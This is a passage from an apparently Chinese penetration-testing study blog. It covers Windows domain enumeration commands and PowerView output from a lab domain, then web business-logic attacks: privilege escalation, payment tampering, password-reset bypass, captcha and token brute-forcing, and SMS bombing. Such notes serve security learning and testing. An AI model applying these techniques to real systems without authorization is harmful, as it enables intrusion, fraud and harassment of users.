/domain</code>：查看主机在域控中的时间和域控的主机名称；继续ping该名称可得到域控的ip地址</p><p>​<code>net view</code> ：查看同一域内机器列表</p><p>​<code>net view \\ip</code> ：查看某ip共享</p><p>​<code>net view \\[username] </code>：查看该user计算机的共享资源列表</p><p>​<code>net view /domain</code>： 查看内网存在多少域</p><p>​<code>net view /domain:域名</code>  ：查看该域内的主机</p><p>​<code>net group /domain</code>：查看域内的用户组</p><p>​<code>net group &quot;domain computers&quot; /domain</code>：查看域内主机</p><p>​<code>net accounts /domain </code>：查询域用户密码过期等信息</p><p>​查找域控</p><p>​<code>nltest /DCLIST:域控名 </code> ：列出当前域内所有域控</p><p>​<code>net group &quot;domain controllers&quot; /domain</code>：列出当前域内域控机器</p><p>​查看域内用户</p><p>​ <code>net user /domain</code>：查看本机域内所有用户</p><p>​更高版本的Windows查看域内用户</p><p>​<code>dsquery.exe user</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; dsquery.exe user</span><br><span class="line"><span class="string">&quot;CN=Administrator,CN=Users,DC=MCITP,DC=COM&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Guest,CN=Users,DC=MCITP,DC=COM&quot;</span></span><br><span class="line"><span class="string">&quot;CN=krbtgt,CN=Users,DC=MCITP,DC=COM&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure><p>​<code>net localgroup administrators /domain</code>：登陆本机的管理员</p><h3 id="2-powershell脚本收集域内信息"><a href="#2-powershell脚本收集域内信息" class="headerlink" title="2.powershell脚本收集域内信息"></a>2.powershell脚本收集域内信息</h3><p>​<code>Set-ExecutionPolicy</code>需要先设置<code>Unrestricted</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt; <span class="built_in">Set-ExecutionPolicy</span></span><br><span class="line"></span><br><span class="line">位于命令管道位置 <span class="number">1</span> 的 cmdlet <span class="built_in">Set-ExecutionPolicy</span></span><br><span class="line">请为以下参数提供值:</span><br><span class="line">ExecutionPolicy: Unrestricted</span><br></pre></td></tr></table></figure><p><code>import-Module .\powershell脚本</code> 导入powershell脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt;</span><br></pre></td></tr></table></figure><p><code>get-netuser</code>：返回域内成员信息</p><p><code>get-NetDomainController</code>：获取域控信息</p><p><code>get-NetComputer</code>：获取域内主机详细信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt; <span class="built_in">get-netcomputer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msds<span class="literal">-generationid</span>             : &#123;<span class="number">214</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">122</span>...&#125;</span><br><span class="line">instancetype                  : <span class="number">4</span></span><br><span class="line">usnchanged                    : <span class="number">36880</span></span><br><span class="line">badpasswordtime               : <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">8</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">codepage                      : <span class="number">0</span></span><br><span class="line">countrycode                   : <span class="number">0</span></span><br><span class="line">ridsetreferences              : CN=RID <span class="built_in">Set</span>,CN=WIN2012,OU=Domain Controllers,DC=</span><br><span class="line">                                MCITP,DC=COM</span><br><span class="line">objectguid                    : <span class="number">07</span>bb8a69<span class="literal">-2a86-4565-abef-baf1db30bd55</span></span><br><span class="line">samaccountname                : WIN2012<span class="variable">$</span></span><br><span class="line">usncreated                    : <span class="number">12293</span></span><br><span class="line">iscriticalsystemobject        : True</span><br><span class="line">displayname                   : WIN2012<span class="variable">$</span></span><br><span class="line">dnshostname                   : win2012.MCITP.COM</span><br><span class="line">msds<span class="literal">-additionaldnshostname</span>    : &#123;WIN<span class="literal">-G16E9C87I50</span>, WIN2012&#125;</span><br><span class="line">pwdlastset                    : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">0</span>:<span class="number">45</span>:<span class="number">10</span></span><br><span class="line">whenchanged                   : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">15</span>:<span class="number">13</span>:<span class="number">50</span></span><br><span class="line">useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION</span><br><span class="line">objectclass                   : &#123;top, person, organizationalPerson, user...&#125;</span><br><span class="line">logoncount                    : <span class="number">27</span></span><br><span class="line">dscorepropagationdata         : &#123;<span class="number">2020</span>/<span class="number">9</span>/<span class="number">17</span> <span class="number">14</span>:<span class="number">46</span>:<span class="number">58</span>, <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">0</span>:<span class="number">00</span>:<span class="number">01</span>&#125;</span><br><span class="line">lastlogontimestamp            : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">0</span>:<span class="number">45</span>:<span class="number">33</span></span><br><span class="line">name                          : WIN2012</span><br><span class="line">localpolicyflags              : <span class="number">0</span></span><br><span class="line">lastlogoff                    : <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">8</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">whencreated                   : <span class="number">2020</span>/<span class="number">9</span>/<span class="number">17</span> <span class="number">14</span>:<span class="number">46</span>:<span class="number">58</span></span><br><span class="line">samaccounttype                : MACHINE_ACCOUNT</span><br><span class="line">distinguishedname             : CN=WIN2012,OU=Domain Controllers,DC=MCITP,DC=CO</span><br><span class="line">                                M</span><br><span class="line">primarygroupid                : <span class="number">516</span></span><br><span class="line">badpwdcount                   : <span class="number">0</span></span><br><span class="line">objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=MCITP</span><br><span class="line">                                ,DC=COM</span><br><span class="line">serviceprincipalname          : &#123;Dfsr<span class="literal">-12F9A27C-BF97-4787-9364-D31B6C55EB04</span>/win2</span><br><span class="line">                                <span class="number">012</span>.MCITP.COM, TERMSRV/WIN2012, TERMSRV/win2012</span><br><span class="line">                                .MCITP.COM, <span class="built_in">GC</span>/WIN2012/MCITP.COM...&#125;</span><br><span class="line">cn                            : WIN2012</span><br><span class="line">operatingsystem               : Windows Server <span class="number">2012</span> R2 Datacenter</span><br><span class="line">objectsid                     : S<span class="literal">-1-5-21-1452006093-426277424-3932888995-1001</span></span><br><span class="line">msds<span class="literal">-supportedencryptiontypes</span> : <span class="number">28</span></span><br><span class="line">operatingsystemversion        : <span class="number">6.3</span> (<span class="number">9600</span>)</span><br><span class="line">lastlogon                     : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">16</span> <span class="number">9</span>:<span class="number">37</span>:<span class="number">33</span></span><br><span class="line">serverreferencebl             : CN=WIN2012,CN=Servers,CN=Default<span class="literal">-First-Site-Nam</span></span><br><span class="line">                                e,CN=Sites,CN=Configuration,DC=MCITP,DC=COM</span><br><span class="line">msdfsr<span class="literal">-computerreferencebl</span>    : CN=WIN<span class="literal">-G16E9C87I50</span>,CN=Topology,CN=Domain System</span><br><span class="line">                                 Volume,CN=DFSR<span class="literal">-GlobalSettings</span>,CN=System,DC=MCI</span><br><span class="line">                                TP,DC=COM</span><br><span class="line">accountexpires                : NEVER</span><br><span class="line"></span><br><span class="line">instancetype                  : <span class="number">4</span></span><br><span class="line">usnchanged                    : <span class="number">33032</span></span><br><span class="line">badpasswordtime               : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">15</span>:<span class="number">55</span>:<span class="number">36</span></span><br><span class="line">codepage                      : <span class="number">0</span></span><br><span class="line">countrycode                   : <span class="number">0</span></span><br><span class="line">objectguid                    : efee98ee<span class="literal">-774b-436b-9966-00b267770123</span></span><br><span class="line">samaccountname                : WIN7<span class="variable">$</span></span><br><span class="line">usncreated                    : <span class="number">32879</span></span><br><span class="line">iscriticalsystemobject        : False</span><br><span class="line">dscorepropagationdata         : <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">pwdlastset                    : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">20</span>:<span class="number">35</span>:<span class="number">25</span></span><br><span class="line">objectclass                   : &#123;top, person, organizationalPerson, user...&#125;</span><br><span class="line">useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT</span><br><span class="line">logoncount                    : <span class="number">30</span></span><br><span class="line">lastlogon                     : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">16</span> <span class="number">9</span>:<span class="number">41</span>:<span class="number">46</span></span><br><span class="line">whenchanged                   : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">12</span>:<span class="number">35</span>:<span class="number">25</span></span><br><span class="line">lastlogontimestamp            : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">14</span>:<span class="number">23</span>:<span class="number">08</span></span><br><span class="line">name                          : WIN7</span><br><span class="line">localpolicyflags              : <span class="number">0</span></span><br><span class="line">lastlogoff                    : <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">8</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">whencreated                   : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">6</span>:<span class="number">23</span>:<span class="number">08</span></span><br><span class="line">samaccounttype                : MACHINE_ACCOUNT</span><br><span class="line">distinguishedname             : CN=WIN7,CN=Computers,DC=MCITP,DC=COM</span><br><span class="line">objectsid                     : S<span class="literal">-1-5-21-1452006093-426277424-3932888995-1104</span></span><br><span class="line">primarygroupid                : <span class="number">515</span></span><br><span class="line">badpwdcount                   : <span class="number">0</span></span><br><span class="line">objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=MCITP</span><br><span class="line">                                ,DC=COM</span><br><span class="line">serviceprincipalname          : &#123;TERMSRV/WIN7, TERMSRV/win7.MCITP.COM, Restrict</span><br><span class="line">                                edKrbHost/WIN7, HOST/WIN7...&#125;</span><br><span class="line">cn                            : WIN7</span><br><span class="line">operatingsystem               : Windows <span class="number">7</span> 专业版</span><br><span class="line">operatingsystemservicepack    : Service Pack <span class="number">1</span></span><br><span class="line">msds<span class="literal">-supportedencryptiontypes</span> : <span class="number">28</span></span><br><span class="line">operatingsystemversion        : <span class="number">6.1</span> (<span class="number">7601</span>)</span><br><span class="line">dnshostname                   : WIN7.MCITP.COM</span><br><span class="line">accountexpires                : NEVER</span><br><span class="line"></span><br><span class="line">instancetype               : <span class="number">4</span></span><br><span class="line">usnchanged                 : <span class="number">32906</span></span><br><span class="line">badpasswordtime            : <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">8</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">codepage                   : <span class="number">0</span></span><br><span class="line">countrycode                : <span class="number">0</span></span><br><span class="line">objectguid                 : <span class="number">975</span>e7e9d<span class="literal">-b6a2-4f2c-aaf4-1925d20a567a</span></span><br><span class="line">samaccountname             : WIN2003<span class="variable">$</span></span><br><span class="line">usncreated                 : <span class="number">32899</span></span><br><span class="line">iscriticalsystemobject     : False</span><br><span class="line">displayname                : WIN2003<span class="variable">$</span></span><br><span class="line">dscorepropagationdata      : <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">pwdlastset                 : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">15</span>:<span class="number">11</span>:<span class="number">13</span></span><br><span class="line">objectclass                : &#123;top, person, organizationalPerson, user...&#125;</span><br><span class="line">useraccountcontrol         : WORKSTATION_TRUST_ACCOUNT</span><br><span class="line">logoncount                 : <span class="number">6</span></span><br><span class="line">lastlogon                  : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">20</span>:<span class="number">53</span>:<span class="number">53</span></span><br><span class="line">whenchanged                : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">7</span>:<span class="number">11</span>:<span class="number">16</span></span><br><span class="line">lastlogontimestamp         : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">15</span>:<span class="number">11</span>:<span class="number">16</span></span><br><span class="line">name                       : WIN2003</span><br><span class="line">localpolicyflags           : <span class="number">0</span></span><br><span class="line">lastlogoff                 : <span class="number">1601</span>/<span class="number">1</span>/<span class="number">1</span> <span class="number">8</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">whencreated                : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">15</span> <span class="number">7</span>:<span class="number">11</span>:<span class="number">13</span></span><br><span class="line">samaccounttype             : MACHINE_ACCOUNT</span><br><span class="line">distinguishedname          : CN=WIN2003,CN=Computers,DC=MCITP,DC=COM</span><br><span class="line">objectsid                  : S<span class="literal">-1-5-21-1452006093-426277424-3932888995-1105</span></span><br><span class="line">primarygroupid             : <span class="number">515</span></span><br><span class="line">badpwdcount                : <span class="number">0</span></span><br><span class="line">objectcategory             : CN=Computer,CN=Schema,CN=Configuration,DC=MCITP,DC</span><br><span class="line">                             =COM</span><br><span class="line">serviceprincipalname       : &#123;HOST/WIN2003, HOST/win2003.MCITP.COM&#125;</span><br><span class="line">cn                         : WIN2003</span><br><span class="line">operatingsystem            : Windows Server <span class="number">2003</span></span><br><span class="line">operatingsystemservicepack : Service Pack <span class="number">2</span></span><br><span class="line">operatingsystemversion     : <span class="number">5.2</span> (<span class="number">3790</span>)</span><br><span class="line">dnshostname                : win2003.MCITP.COM</span><br><span class="line">accountexpires             : NEVER</span><br><span class="line"><span class="built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt;</span><br></pre></td></tr></table></figure><p>​powerview手册：<a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows域 </tag>
            
            <tag> 用户/系统/域内命令 </tag>
            
            <tag> windows开启/关闭3389 </tag>
            
            <tag> windows UAC </tag>
            
            <tag> windows ASR </tag>
            
            <tag> windows applocker </tag>
            
            <tag> windows access token </tag>
            
            <tag> windows 认证及密码 </tag>
            
            <tag> windows poweshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权</title>
      <link href="/2020/06/20/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"/>
      <url>/2020/06/20/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="1-水平、垂直越权"><a href="#1-水平、垂直越权" class="headerlink" title="1.水平、垂直越权"></a>1.水平、垂直越权</h2><p><img src="image-20210802234218867.png" alt="image-20210802234218867"></p><h3 id="1-相关基础知识"><a href="#1-相关基础知识" class="headerlink" title="1.相关基础知识"></a>1.相关基础知识</h3><p><strong>产生越权的原理</strong></p><p>1.前端UI界面根据用户等级不同，进行了部分可选功能显示</p><p>2.后端数据库中，根据用户等级的不同，设置了相应的组别，只要是该组别的用户就可以进行相应的操作</p><p>在访问网站时，数据包中有相应的传输用户的编号、用户组编号或者类型编号</p><h4 id="1-水平越权"><a href="#1-水平越权" class="headerlink" title="1.水平越权"></a>1.水平越权</h4><p>通过更换ID之类的身份标识，从而使A账号获取（修改、删除）B账号的数据，但A、B拥有相同的权限等级，也即属于同一组之类。这是由于服务器端在接收到请求数据进行操作时没有判断数据的所属人&#x2F;所属部门而导致的越权数据访问漏洞。 </p><p> <img src="image-20210802234353701.png" alt="image-20210802234353701"></p><h4 id="2-垂直越权"><a href="#2-垂直越权" class="headerlink" title="2.垂直越权"></a>2.垂直越权</h4><p>通过低权限账户发送高权限账户才能有的请求，获取高权限的操作</p><p>由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。</p><p> <img src="image-20210802234605476.png" alt="image-20210802234605476"></p><p>普通用户获取管理员的权限，一般需要知道管理员操作界面的数据包，而获取数据包的方法有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.根据后台，自己本地搭建一样的平台进行抓包分析构造</span><br><span class="line"></span><br><span class="line">2.普通用户前端操作界面抓取数据包</span><br><span class="line"></span><br><span class="line">3.盲猜 </span><br></pre></td></tr></table></figure><h4 id="3-未授权访问"><a href="#3-未授权访问" class="headerlink" title="3.未授权访问"></a>3.未授权访问</h4><p>删除请求中的认证信息后重放改请求，依旧可以访问完成该操作</p><p>26种未授权访问漏洞总结：<a href="https://blog.csdn.net/qq_29277155/article/details/108390891?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/qq_29277155/article/details/108390891?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a></p><h3 id="2-工具检测"><a href="#2-工具检测" class="headerlink" title="2.工具检测"></a>2.工具检测</h3><p>1.中通安全开源项目之越权漏洞自动化检测</p><p><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a></p><p><a href="https://mp.weixin.qq.com/s/vwF7aTvk-U-SnJqO3f80gA">https://mp.weixin.qq.com/s/vwF7aTvk-U-SnJqO3f80gA</a></p><p> 2.高版本burp插件Authz，在burp自带的商店里面进行安装即可</p><p>3.小米范</p><h3 id="3-修复"><a href="#3-修复" class="headerlink" title="3.修复"></a>3.修复</h3><p>1.前后端同时对用户输入信息进行校验，双重验证机制</p><p>2.调用功能前验证用户是否有权限调用相关功能</p><p>3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p><p>4.直接对象引用的加密资源工防止攻击者枚举ID，敏感数据特殊化处理</p><p>5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p><h2 id="2-支付数据篡改安全"><a href="#2-支付数据篡改安全" class="headerlink" title="2.支付数据篡改安全"></a>2.支付数据篡改安全</h2><h3 id="1-登陆点"><a href="#1-登陆点" class="headerlink" title="1.登陆点"></a>1.登陆点</h3><h4 id="1-登陆点暴力破解"><a href="#1-登陆点暴力破解" class="headerlink" title="1.登陆点暴力破解"></a>1.登陆点暴力破解</h4><p>未加密就直接爆破，加密涉及到下面的协议</p><h4 id="2-HHTP-HTTPS传输"><a href="#2-HHTP-HTTPS传输" class="headerlink" title="2.HHTP&#x2F;HTTPS传输"></a>2.HHTP&#x2F;HTTPS传输</h4><p>HTTP采用明文传输，HTTPS采用加密传输，若进行HTTPS网站进行爆破，需要先猜解加密形式才能进行爆破</p><p>字典：<a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></p><p>一般进行加密破解有两种方法</p><p>1.burp</p><p>在设置了爆破字典之后，要选择payload processing中的hash，选择对应的加密方式</p><p><img src="image-20210803000445658.png" alt="image-20210803000445658"><img src="image-20210803000455114.png" alt="image-20210803000455114"></p><h4 id="3-cookie脆弱点验证"><a href="#3-cookie脆弱点验证" class="headerlink" title="3.cookie脆弱点验证"></a>3.cookie脆弱点验证</h4><p>即cookie验证时只验证了 </p><p>1.黑盒</p><p> 也就是在没有源码的情况下，查看数据包的cookie出有没有可操作性，比如将以下cookie做更改可以登录到test账户</p><p><img src="image-20210803000528947.png" alt="image-20210803000528947"></p><p>2.白盒</p><p>也即是代码审计，熊海cms 1.0 存在这种情况</p><h4 id="4-session固定点测试"><a href="#4-session固定点测试" class="headerlink" title="4.session固定点测试"></a>4.session固定点测试</h4><h4 id="5-验证密文对比安全测试"><a href="#5-验证密文对比安全测试" class="headerlink" title="5.验证密文对比安全测试"></a>5.验证密文对比安全测试</h4><h3 id="2-业务点"><a href="#2-业务点" class="headerlink" title="2.业务点"></a>2.业务点</h3><p>业务点也即涉及到篡改数据</p><p>原理、检测、危害、修复等： <a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p><p><strong>商品购买流程</strong></p><p>选择商品和数量-选择支付以及配送方式-生成顶单编号-订单支付选择-完成支付</p><p><strong>常见篡改参数</strong></p><p>商品编号ID、购买价格、购买数量、支付方式、订单号、支付状态‘</p><p><strong>常见修改方法</strong></p><p>替换支付、重复支付、最小额支付、负数支付、溢出支付、优惠卷支付等等</p><h2 id="3-找回机制及接口安全"><a href="#3-找回机制及接口安全" class="headerlink" title="3.找回机制及接口安全"></a>3.找回机制及接口安全</h2><h3 id="1-找回机制"><a href="#1-找回机制" class="headerlink" title="1.找回机制"></a>1.找回机制</h3><h4 id="1-客户端回显"><a href="#1-客户端回显" class="headerlink" title="1.客户端回显"></a>1.客户端回显</h4><p>验证码在浏览器数据中可以看到</p><h4 id="2-response状态值"><a href="#2-response状态值" class="headerlink" title="2.response状态值"></a>2.response状态值</h4><p>在进行请求之后服务器会有返回值，我们就可对此回显值进行修改为正确的值，此时如果服务器是以浏览器回显值作为验证，那么此时修改回显值就可以有效绕过验证，如果是以服务器为准，那么修改无效</p><p>修改状态值</p><p><img src="image-20210803001149690.png" alt="image-20210803001149690"></p><h4 id="3-验证码爆破"><a href="#3-验证码爆破" class="headerlink" title="3.验证码爆破"></a>3.验证码爆破</h4><p>目标在验证码验证时没有进行次数限制、验证码时效较长、客户端没有验证码(如每次点击都有新的验证码、点击图片、点击文字等，有可进行识别绕过，有收费版和免费的，效果参差不一)</p><p>注意可能爆破返回值长度一样，此时可能会成功，就需要自己一个一个取查看返回值是不是一样进行验证</p><h4 id="4-找回流程绕过"><a href="#4-找回流程绕过" class="headerlink" title="4.找回流程绕过"></a>4.找回流程绕过</h4><p>例如-墨者-登陆密码重置漏洞分析溯源</p><p>在充值密码时，只接受了要重置的账户，并发送了验证码，但是并没有二次进行验证所要重置的账户是不是之前发送验证码的账户</p><h4 id="5-session覆盖"><a href="#5-session覆盖" class="headerlink" title="5.session覆盖"></a>5.session覆盖</h4><h4 id="6-弱token缺陷"><a href="#6-弱token缺陷" class="headerlink" title="6.弱token缺陷"></a>6.弱token缺陷</h4><h3 id="2-接口调用"><a href="#2-接口调用" class="headerlink" title="2.接口调用"></a>2.接口调用</h3><h4 id="1-调用遍历"><a href="#1-调用遍历" class="headerlink" title="1.调用遍历"></a>1.调用遍历</h4><h4 id="2-参数篡改"><a href="#2-参数篡改" class="headerlink" title="2.参数篡改"></a>2.参数篡改</h4><h4 id="3-未授权访问-1"><a href="#3-未授权访问-1" class="headerlink" title="3.未授权访问"></a>3.未授权访问</h4><h4 id="4-callback自定义"><a href="#4-callback自定义" class="headerlink" title="4.callback自定义"></a>4.callback自定义</h4><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1.短信轰炸</p><p>例如请求下面的数据包，就会造成发送验证码，此时可以写一个循环请求，就会一直发送验证码</p><p><img src="image-20210803001438953.png" alt="image-20210803001438953"></p><p>2.来电轰炸</p><h2 id="4-验证码、token、接口"><a href="#4-验证码、token、接口" class="headerlink" title="4.验证码、token、接口"></a>4.验证码、token、接口</h2><h3 id="1-token"><a href="#1-token" class="headerlink" title="1.token"></a>1.token</h3><p>用于检验数据包唯一性</p><h4 id="1-爆破"><a href="#1-爆破" class="headerlink" title="1.爆破"></a>1.爆破</h4><p>1.根据token的格式猜测加密形式以及未来出现的值，不大可能猜得到~</p><p>2.burp进行爆破，也即下面的回显爆破</p><h4 id="2-回显"><a href="#2-回显" class="headerlink" title="2.回显"></a>2.回显</h4><p>请求之后，在返回数据包可查看到token</p><p>爆破时，选择token爆破type为</p><p><img src="image-20210803001532536.png" alt="image-20210803001532536"></p><p>线程设置为1，设置重定向</p><p><img src="image-20210803001548822.png" alt="image-20210803001548822"></p><p>再选择Grep-Extract,添加token值</p><p><img src="image-20210803001602502.png" alt="image-20210803001602502"></p><p>点击ok即可</p><h4 id="3-固定"><a href="#3-固定" class="headerlink" title="3.固定"></a>3.固定</h4><h3 id="2-验证码"><a href="#2-验证码" class="headerlink" title="2.验证码"></a>2.验证码</h3><p>分类：图片、手机或邮箱、语音、视频、操作等</p><p>原理：验证生成或验证过程中的逻辑问题</p><p>危害：账户权限泄露、短信轰炸、遍历、任意用户操作等</p><h4 id="1-爆破-1"><a href="#1-爆破-1" class="headerlink" title="1.爆破"></a>1.爆破</h4><h4 id="2-识别"><a href="#2-识别" class="headerlink" title="2.识别"></a>2.识别</h4><p>1.工具：Pkav_Http_Fuzz</p><p> 缺点：不支持第三方拓展，只能在其上操作数据包</p><p>2.插件</p><p><a href="https://www.cnblogs.com/nul1/p/12071115.html">https://www.cnblogs.com/nul1/p/12071115.html</a></p><p><a href="https://github.com/c0ny1/captcha-killer/releases">https://github.com/c0ny1/captcha-killer/releases</a></p><p><a href="https://github.com/bit4woo/reCAPTCHA/releases">https://github.com/bit4woo/reCAPTCHA/releases</a></p><p> 免费的效果不太好，付费的还行。。</p><h4 id="3-复用"><a href="#3-复用" class="headerlink" title="3.复用"></a>3.复用</h4><h5 id="1-服务端校验不完全"><a href="#1-服务端校验不完全" class="headerlink" title="1.服务端校验不完全"></a>1.服务端校验不完全</h5><p>验证码在服务端进行比对之后没有删除，造成了可被多次利用</p><p>例如pikachu靶场提示了</p><p><img src="image-20210803001634718.png" alt="image-20210803001634718"></p><h5 id="2-客户端校验"><a href="#2-客户端校验" class="headerlink" title="2.客户端校验"></a>2.客户端校验</h5><p>查看网页源代码，查看是否有检测验证码的相关js函数，有时候时把检测js代码封装为一个js文件，所以这时看不到js代码，就要抓包查看加载的一些js文件是否有相关的验证代码</p><p> <img src="image-20210803001701826.png" alt="image-20210803001701826"></p><h4 id="4-回显"><a href="#4-回显" class="headerlink" title="4.回显"></a>4.回显</h4><h3 id="3-接口安全问题"><a 